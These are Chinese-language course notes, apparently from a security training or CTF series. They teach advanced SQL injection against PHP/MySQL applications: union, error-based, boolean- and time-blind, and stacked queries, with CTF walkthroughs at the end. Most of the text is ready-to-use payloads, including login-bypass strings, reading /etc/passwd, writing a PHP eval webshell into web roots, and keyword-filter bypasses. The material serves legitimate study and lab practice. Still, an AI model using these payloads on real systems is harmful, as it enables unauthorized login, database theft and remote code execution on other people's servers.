# 第四天：SQL注入进阶

## 核心概念

第三天的内容主要集中在联合注入和报错注入这两种有回显的注入方式。但在真实场景里，大多数注入点既不会把查询结果展示在页面上，也不会把数据库报错信息丢出来。这种情况下就需要用盲注——通过页面行为的细微差异（布尔盲注）或者响应时间的差异（时间盲注）来逐字符地推断数据。

另外今天还讲了一个很关键的概念：**堆叠注入**。跟 UNION 不一样，堆叠注入是用分号 `;` 把多条完整的 SQL 语句串在一起执行。这比 UNION 灵活得多，但前提是后端使用的数据库连接函数支持多语句执行（比如 PHP 的 `mysqli_multi_query()`）。

---

## 一、注入点的检测与闭合判断

### 闭合方式判断的完整流程

做注入的第一步永远是搞清楚两件事：这个参数在 SQL 里是怎么被包起来的，以及整个语句的上下文是什么。

以 GET 参数为例，假设后端代码是：

```sql
select username from table where username = ('$_GET["name"]') limit 0,1
```

测试闭合的基本套路：

1. 先输入正常值（比如 `admin`），记住页面长什么样
2. 输入 `admin' and 1=1 # `，页面和正常一样，说明注入成立、闭合方式正确
3. 输入 `admin' and 1=2 # `，页面和正常不一样，印证了第2步的结论

URL编码后就是 `admin%27%20and%201=1%23` 跟 `admin%27%20and%201=2%23`，效果一样。`--+` 也可以替代 `#` 做注释，效果等价。

### 利用报错反推断闭合

如果网站有报错回显，那就简单多了。举个例子：

- 输入 `'+and+1=1--+`，报错 `near ''+and+1=1--+'`，说明参数被单引号包裹
- 输入 `' and 1=1-- `，报错 `near '' and 1=1--'`，同样确认是单引号闭合

换个场景，如果后端是数字型（无引号包裹）：

```sql
select username,email from table where id = $_POST['id'] limit ...
```

输入 `1 and 1=1 --+` 正常，输入 `1 and 1=2 --+` 异常，说明是数字型注入。

### 延时验证

布尔盲注的场景下，`1' and 1=1 # ` 和 `1' and 1=2 # ` 可能页面完全一样（因为查询结果不显示）。这时用 `1' and sleep(5)--+` 来验证：如果页面真的卡了5秒，说明注入点确实存在。

---

## 二、登录绕过

登录框是 SQL 注入最经典的应用场景之一。典型的后端逻辑：

```sql
select * from table where username = '$_POST["name"]' and passwd = '$_POST["pwd"]'
```

攻击者可以在用户名字段输入 `' or 1=1#`，拼出来就是：

```sql
select * from table where username = '' or 1=1#' and passwd = '$_POST["pwd"]'
```

`or 1=1` 让 WHERE 条件永远为真，`#` 把后面的密码校验部分全部注释掉。结果就是不需要知道任何密码就能以第一条记录的身份登录进去。

同理，在密码字段用 `' or 1=1#` 也行，只是注释掉的是前面的用户名部分。

常用的万能密码 payload：
- `' or 1=1#`
- `" or 1=1#`
- `' or '1'='1`
- `admin'-- `

---

## 三、联合注入（Union Injection）回顾与要点

### 判断列数

两种方法：

**ORDER BY 法：**

```
闭合前面语句 ORDER BY 2 注释    -- 正常，说明至少2列
闭合前面语句 ORDER BY 3 注释    -- 正常，说明至少3列
闭合前面语句 ORDER BY 4 注释    -- 报错，说明只有3列
```

**GROUP BY 法：** 同理，用 `GROUP BY N` 替代 `ORDER BY N`。

**UNION SELECT 法：**

```
闭合前面语句 union select 1,2 注释    -- 列数不匹配报错
闭合前面语句 union select 1,2,3 注释  -- 正常，确认3列
```

> 建议用 `UNION SELECT NULL,NULL,...` 的方式，避免数据类型冲突。

### 判断回显位置

把前面查询的结果置空（比如 `id=0'` 或 `id=-1'`），然后用 UNION SELECT 在不同位置放数字：

```
id=0' UNION ALL SELECT 1,2,3--+
```

假设页面显示：
```
Your Login name:2
Your Password:3
```

说明第2列和第3列都是回显位。

### 利用回显位逐步获取数据

**库名：**
```
id=0' UNION ALL SELECT 1,(database()),(version())--+
```
输出：数据库名 `security`，版本 `5.5.44-0ubuntu0.14.04.1`

**表名：**
```
id=0' UNION ALL SELECT 1,(database()),(SELECT group_concat(table_name) from information_schema.`TABLES` where table_schema = 'security')--+
```
输出：`emails,referers,uagents,users`

**列名：**
```
id=0' UNION ALL SELECT 1,(database()),(SELECT group_concat(COLUMN_name) from information_schema.`COLUMNS` where table_schema = 'security' and TABLE_name = 'users')--+
```
输出：`id,username,password`

**数据：**
```
id=0' UNION ALL SELECT 1,(database()),(SELECT CONCAT(id,0x7e,username,0x7e,password) from security.users limit 0,1)--+
```
输出：`1~Dumb~Dumb`

逐行翻数据就把 `limit 0,1` 改成 `limit 1,1`、`limit 2,1` 一直翻下去。

### 读写文件（需要特定条件）

读写文件不是每次都能用的，需要同时满足三个前提：
1. 数据库用户有文件操作权限（一般是 `root@localhost`）
2. 操作系统层面的 mysql 进程用户有对应目录的读写权限
3. MySQL 配置 `secure_file_priv` 允许（值为空或指定目录）

**读文件 — load_file()：**
```
-- Linux
id=0' UNION ALL SELECT 1,(database()),(load_file('/etc/passwd'))--+
-- Windows
id=0' UNION ALL SELECT 1,(database()),(load_file('c:/windows/win.ini'))--+
```

**写文件 — INTO OUTFILE / INTO DUMPFILE：**
```sql
SELECT 'qwerty' INTO OUTFILE 'F:/2.txt';
SELECT 'asdfgh' INTO DUMPFILE 'F:/3.txt';
```

OUTFILE 和 DUMPFILE 的区别：OUTFILE 会在写入内容后加换行符，DUMPFILE 是原样写入不做任何处理。

**写 webshell 的完整 payload：**
```
-- Linux（典型 web 目录 /var/www/html）
id=0' UNION ALL SELECT 1,2,'<?php @eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/qwe.php'--+

-- Windows（常见集成环境的目录）
id=0' UNION ALL SELECT 1,2,'<?php @eval($_POST[1]);?>' INTO OUTFILE 'c:/xampp2/htdocs/qwe.php'--+
```

网站根目录常见的几个位置：
- Linux: `/var/www/html`
- Windows + phpStudy: `c:/phpstudy_pro/www`
- Windows + XAMPP: `c:/xampp2/htdocs`

---

## 四、报错注入（Error-based Injection）

当页面不直接展示查询结果、但会把数据库报错信息显示出来时，可以用报错注入。核心思路是**故意让数据库在执行我们构造的表达式时抛出错误，而错误信息里夹带了我们需要的数据**。

### extractvalue() — XPATH 报错

`extractvalue(xml_target, xpath_expr)` 是 MySQL 的 XML 函数。当第二个参数不是合法的 XPath 表达式时，MySQL 会抛出错误，而错误信息里会包含那个"非法"的 XPath 内容。

用法：`extractvalue(1, concat(0x7e, (要执行的SQL语句), 0x7e))`

`0x7e` 是波浪号 `~`，起一个标记作用，让报错信息中的有效数据更容易辨认。

**逐级获取数据的完整示例：**

库名：
```
id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+
-- XPATH syntax error: '~security~'
```

版本：
```
id=1' and extractvalue(1,concat(0x7e,(select version()),0x7e)) --+
-- XPATH syntax error: '~5.5.44-0ubuntu0.14.04.1~'
```

表名：
```
id=1' and extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) from information_schema.TABLES where table_schema = 'security'),0x7e)) --+
-- XPATH syntax error: '~emails,referers,uagents,users~'
```

列名（指定表）：
```
id=1' and extractvalue(1,concat(0x7e,(SELECT group_concat(COLUMN_name) from information_schema.COLUMNS where table_schema = 'security' and TABLE_name = 'emails'),0x7e)) --+
-- XPATH syntax error: '~id,email_id~'
```

数据（逐行查）：
```
id=1' and extractvalue(1,concat(0x7e,(select concat(id,0x7e,email_id) from security.emails limit 0,1),0x7e)) --+
-- XPATH syntax error: '~1~Dumb@dhakkan.com~'

id=1' and extractvalue(1,concat(0x7e,(select concat(id,0x7e,email_id) from security.emails limit 1,1),0x7e)) --+
-- XPATH syntax error: '~2~Angel@iloveu.com~'
```

**读文件（分段读，因为 extractvalue 一次最多回显32字符）：**
```
id=1' and extractvalue(1,concat(0x7e,(select substr((load_file('/etc/passwd')),1,20)),0x7e)) --+
-- XPATH syntax error: '~root:x:0:0:root:/roo~'

id=1' and extractvalue(1,concat(0x7e,(select substr((load_file('/etc/passwd')),21,20)),0x7e)) --+
-- XPATH syntax error: '~t:/bin/bash daemon:x~'
```

一直用 `substr()` 偏移下去，直到返回 `~~` 空内容，说明文件读完了。

### updatexml() — 同原理的另一种 XPATH 报错

`updatexml(xml_target, xpath_expr, new_xml)` 跟 extractvalue 原理一样，只是多一个参数。

固定句式：`updatexml(1, concat(0x7e, (SQL语句), 0x7e), 1)`

用法和 extractvalue 完全一致，从库名到表名到列名到数据，payload 结构一模一样，只是把函数名换成了 updatexml 并多传一个参数 `1`。

### group by 主键冲突报错

这种报错方式的原理和 XPATH 报错不同，它利用的是 `floor(rand(0)*2)` 配合 `group by` 时产生的**主键重复冲突**。

固定句式：
```sql
select count(*),(concat(floor(rand(0)*2),0x7e,(执行的语句)))x from information_schema.tables group by x
```

在注入中配合 UNION 调整列数：
```
id=1' union select 1,count(*),(concat(floor(rand(0)*2),0x7e,(SELECT database())))x from information_schema.tables group by x --+
-- Duplicate entry '1~security' for key 'group_key'
```

`floor(rand(0)*2)` 产生的序列是确定的（0,1,1,0,1,1,0...），在 group by 的计数过程中必然触发两次相同值尝试插入临时表，从而引发主键冲突。计算过程比较复杂，但作为攻击者只需要记住这个固定句式即可。

### exp() 函数报错

适用条件比较苛刻：**MySQL 版本必须在 5.5 < version < 5.6**。

原理：`exp()` 是计算 e 的多少次方。`~` 对一个正整数取反后得到的是非常大的无符号 BIGINT 值，把这个值传给 `exp()` 会导致 double overflow error，从而报错。报错信息里会包含子查询的结果。

句式：
```sql
exp(~(select * from (查询的数据) x))
```

注入示例（库名）：
```
1' and exp(~(select * from (select database())x)) %23
-- DOUBLE value is out of range in 'exp(~((select 'security' from dual)))'
```

这个手法因为 MySQL 版本限制太窄，实际中能用上的场景不多，属于特定环境下的特殊手法。

---

## 五、布尔盲注（Boolean-based Blind Injection）

布尔盲注的根本特征是：**查询结果不会直接显示，但页面会因查询条件成立与否而表现出两种不同的状态**（比如"用户存在"和"用户不存在"两个不同的页面）。

### 确认注入点和闭合方式

跟第三天的方法一样：
- `1` — 正常
- `1'#` — 正常
- `1' and 1=1 #` — 正常（条件为真，页面正常）
- `1' and 1=2 #` — 异常（条件为假，页面变化）

如果有报错最好，没报错就靠 `and 1=1` / `and 1=2` 的页面差异来确认。确认后再用 `1' and sleep(3)--+` 做交叉验证。

### 获取数据库名

**先猜长度：**
```sql
1' and LENGTH((SELECT database())) > 5 --+
```
如果页面正常说明长度大于5，一直调整直到找到精确长度：
```sql
1' and LENGTH((SELECT database())) = 8 --+
```

**然后逐字符猜解：**
```sql
1' and SUBSTR((SELECT DATABASE()),1,1) = 'q' --+
```

但 `SUBSTR` 直接比字符有个致命问题：**无法区分大小写**（取决于数据库的 collation 设置）。更可靠的做法是用 `ord()` 转成 ASCII 码再比较：
```sql
1' and ord(SUBSTR((SELECT DATABASE()),1,1)) = 48 --+
```

实际中不会手工做这件事，交给 Burp Suite 的 Intruder 或者 Yakit 去跑。

其他可以用的字符提取函数：`substr()`、`left()`、`mid()`、`like`、`regexp`。

用 `like` 的通配符方式有时候更高效：
```sql
1' and (select database()) like 'a%' --+   -- 判断数据库名是否以 a 开头
```

### 获取表名

**方案一：把所有表名拼起来再逐字符猜**

先确定拼接后字符串的总长度：
```sql
1' and LENGTH((SELECT group_concat(table_name) from information_schema.tables where table_schema = 'security')) = 29 --+
```

然后逐字符猜：
```sql
1' and ord(substr((SELECT group_concat(table_name) from information_schema.tables where table_schema = 'security'),1,1)) = 48 --+
```

**方案二：逐张表、逐字符猜**

先确定有几张表：
```sql
1' and LENGTH((SELECT table_name from information_schema.tables where table_schema = 'security' limit 0,1)) > 0 --+
```
用 `limit N,1` 尝试不同的 N，直到查不到新表为止。

然后对每一张表逐字符猜解表名。

方案二的灵活性更高——不依赖 `group_concat` 的长度限制，也不容易被特殊字符干扰。

### 获取列名和数据

逻辑完全一样：先猜列名字符串长度，再逐字符爆破。拿到列名后，对目标数据做同样的操作。

### 布尔盲注的本质

布尔盲注的核心就是**把任何想知道的信息转换成一个真/假问题，然后通过页面差异来判断答案**。不管拿什么数据，本质上都是在问数据库"这个字符的 ASCII 码是不是 X？"。

---

## 六、时间盲注（Time-based Blind Injection）

时间盲注是**最后的手段**。当页面在查询成功和失败时返回完全一样的页面（没有布尔差异），也没有报错信息，就只能靠时间盲注了——让数据库在执行特定条件时延迟响应，通过观察响应时间来判断条件是否成立。

### 确认注入点

这个环节和布尔盲注不一样。布尔盲注靠 `and 1=1` 和 `and 1=2` 的页面差异，时间盲注中这两个条件的页面是一样的。所以需要用延时函数来确认：

```sql
1' and sleep(3)--+
1" and sleep(3)--+
1') and sleep(3)--+
```

不断换闭合方式，直到某一种让页面真的延迟了3秒才返回。

另一种延时手段是用 `BENCHMARK()` 制造大量计算来拖慢响应：
```sql
1' and BENCHMARK(10000000,SHA(1))--+
```

`BENCHMARK(10000000, SHA(1))` 的意思是对 `SHA(1)` 执行一千万次，这在性能差的服务器上会造成明显的延迟。

	### IF 分支 + sleep

最常用的时间盲注手法，把条件判断和延时绑定在一起：

**判断数据库名字符长度：**
```sql
1' and IF(LENGTH((SELECT DATABASE())) > 5, Sleep(3), 1) --+
```
如果页面延迟了3秒，说明 `LENGTH > 5` 成立。调整阈值直到找到精确长度：
```sql
1' and IF(LENGTH((SELECT DATABASE())) = 8, Sleep(3), 1) --+
```

**逐字符获取数据库名：**
```sql
1' and IF(ord(substr((SELECT DATABASE()),1,1)) = 48, Sleep(3), 1) --+
```
Burp/Yakit 批量爆破，观察哪些 payload 的响应时间明显偏长。

**获取表名（同样的 IF + sleep 套路）：**

先确定拼接字符串长度：
```sql
1' and IF(LENGTH((select group_concat(table_name) from information_schema.tables where table_schema = 'security')) = 29, Sleep(3), 1) --+
```

再逐字符爆破：
```sql
1' and IF(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema = 'security'),1,1)) = 48, Sleep(3), 1) --+
```

### CASE WHEN 分支 + sleep

跟 IF 等价，换种写法：

**判断长度：**
```sql
1' and case LENGTH((SELECT DATABASE())) when 8 then Sleep(3) else 1 end --+
```

**逐字符：**
```sql
1' and case ord(substr((SELECT DATABASE()),1,1)) when 48 then Sleep(3) else 1 end --+
```

### sleep 乘数法

把比较结果（0 或 1）直接乘到 sleep 的参数上：

**判断长度：**
```sql
1' and sleep((LENGTH((SELECT DATABASE())) > 5) * 3) --+
```
如果 `LENGTH > 5` 成立，表达式值为 1，`sleep(1 * 3)` = 延迟3秒。如果不成立，表达式值为 0，`sleep(0 * 3)` = 不延迟。

**逐字符：**
```sql
1' and sleep((ord(mid((SELECT DATABASE()),1,1)) = 48) * 3) --+
```

这种写法不用 IF 或 CASE，在某些关键字被过滤时有用。

### 三种写法的选择

在实际做题中：
- IF 版本最直观，优先用
- CASE WHEN 版本多了一种写法，在 IF 被过滤时顶上
- sleep 乘数法最简洁，但可读性差一点，也依赖 MySQL 对布尔值隐式转换的行为

---

## 七、堆叠注入（Stacked Queries）

堆叠注入和前面所有注入方式的根本区别在于：前面讲的都是在一个 SELECT 语句的框架内"做手脚"（UNION 追加查询、报错带出数据、盲注逐字推断），而堆叠注入是**用分号结束前面的语句，然后另起一句全新的 SQL 语句**。

典型的堆叠注入 payload：
```sql
admin'; create database qwe;#
```

拼到后端语句中：
```sql
select username from table where username = ('admin'); create database qwe;#') limit 0,1
```

MySQL 会顺序执行两条语句：
1. `select username from table where username = ('admin')` — 正常查询
2. `create database qwe` — 创建新数据库

### 堆叠注入的利用范围

除了 `SELECT`，堆叠注入可以执行 `INSERT`、`UPDATE`、`DELETE`、`DROP`、`CREATE`、`ALTER` 等几乎所有类型的 SQL 语句。灵活性远超 UNION/报错/盲注。

### 经典 CTF 案例

**BUU SQL COURSE 1 — 绕过关键字过滤：**

题目过滤了 `select|update|delete|drop|insert|where|\.`。不能用 SELECT 查数据，但可以用堆叠注入执行其他操作：

```sql
1';show databases;show tables;desc `1919810931114514`;#
```

这里用 `show databases`、`show tables`、`desc` 这些不需要 SELECT 的命令来获取数据库结构信息。找到 flag 所在的表和列之后，有两种思路：

**思路一：修改表结构（alter table）**
```sql
1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#
```
把 flag 表改名成 words，把 flag 列改名成 id，然后直接按正常业务逻辑查询。

**思路二：预编译绕过**
```sql
-1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#
```
用 `CONCAT` 把被过滤的 `select` 拆成 `'se'` 和 `'lect'`，拼接后通过预编译执行。

**[SUCTF 2019]EasySQL — 管道符特性利用：**

这道题的过滤相当变态：`prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&|"`

但题目中的 SQL 语句用了 `||` 管道符拼接：
```sql
select $query || 1 from tables;
```

在 MySQL 中，如果 `sql_mode` 包含 `PIPES_AS_CONCAT`，`||` 就是字符串拼接。这里的非预期解法利用了 `||` 的特性。

---

## 八、CTF 综合练习回顾

### [极客大挑战 2019]EasySQL

最简单的情况，万能密码 `' or 1=1#` 直接登录。没有过滤，没有防护，属于入门练手题。

### [极客大挑战 2019]LoveSQL

标准联合注入流程。`admin' order by 4#` 报错确定3列，然后 UNION SELECT 走完整个流程：库名 `geek`，表名 `geekuser,l0ve1ysq1`，最终从 `l0ve1ysq1` 表的 `password` 字段拿到 flag。

### [极客大挑战 2019]BabySQL

这道题有**关键词过滤**，但过滤只做了一次替换（不递归）。绕过方式有两种：

**双写绕过：** 过滤掉关键字后，剩下的字符又拼成了关键字。

```
oorrder bbyy → 去掉中间的 or 和 by → order by
ununionion seselectlect → 去掉中间的 union 和 select → union select
```

同样，`frfromom` → `from`，`whwhereere` → `where`，`anandd` → `and`，`passwoorrd` → `password`。

拿到 flag 的关键 payload：
```
username = admi' ununionion seselectlect 1,(seselectlect concat(id,0x7e,username,0x7e,passwoorrd) frfromom b4bsql whwhereere passwoorrd like '%{%' ),3#
```

这道题的 leak 点在于：过滤只正则匹配了一次没有递归，而且注释符 `#` 没有被过滤。

### [极客大挑战 2019]HardSQL

这道题过滤更严，`union` 被完全封死，只能用**报错注入**。

关键发现：`=` 被过滤，但 `like` 可以用。空格被过滤，用括号 `()` 绕过。

```sql
1'^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')),0x7e),1)%23
```

注意这里的几个绕过技巧：
- `^` 代替空格做异或连接
- `()` 代替空格分隔关键字
- `like` 代替 `=`

XPATH 报错一次最多回显32个字符，所以需要分段读取 flag：
```sql
-- 读前30个字符
1'^updatexml(1,concat(0x7e,left((select(password)from(H4rDsq1)where(password)like('%{%')),30),0x7e),1)%23
-- 读后30个字符
1'^updatexml(1,concat(0x7e,right((select(password)from(H4rDsq1)where(password)like('%{%')),30),0x7e),1)%23
```

拼起来得到完整的 flag。

---

## 小结

第四天的内容本质上就是**注入深度上的推进**：

| 注入类型 | 前提条件 | 数据获取方式 |
|---------|---------|------------|
| 联合注入 | 有回显位 | 直接在页面上看结果 |
| 报错注入 | 有报错信息 | 从报错信息中提取数据 |
| 布尔盲注 | 页面有两种不同状态 | 逐字符问"是不是 X" |
| 时间盲注 | 能执行 SQL（几乎无要求） | 逐字符通过延时判断 |
| 堆叠注入 | 数据库连接支持多语句 | 另起一句全新 SQL |

从联合注入到时间盲注，本质上是**可利用的信息通道越来越窄**：
- 联合注入：你能看到完整结果，想查什么查什么
- 报错注入：你只能看到一行报错信息，每次最多32字符
- 布尔盲注：你只能看到一个"是/否"的答案，需要成千上万次请求
- 时间盲注：你连"是/否"都看不到，只能通过延时来推断

这就是 SQL 注入的"降级"使用——随着可利用条件的恶化，攻击从"直接读取"退化到"逐比特推断"，虽然越来越慢，但只要注入点存在，理论上没有拿不到的数据。

堆叠注入则属于另一个维度——它不是精度问题，而是**执行能力的质变**。如果你的注入点支持堆叠，你就不需要在 SELECT 的框架里绕来绕去了，直接执行任意 SQL 语句。
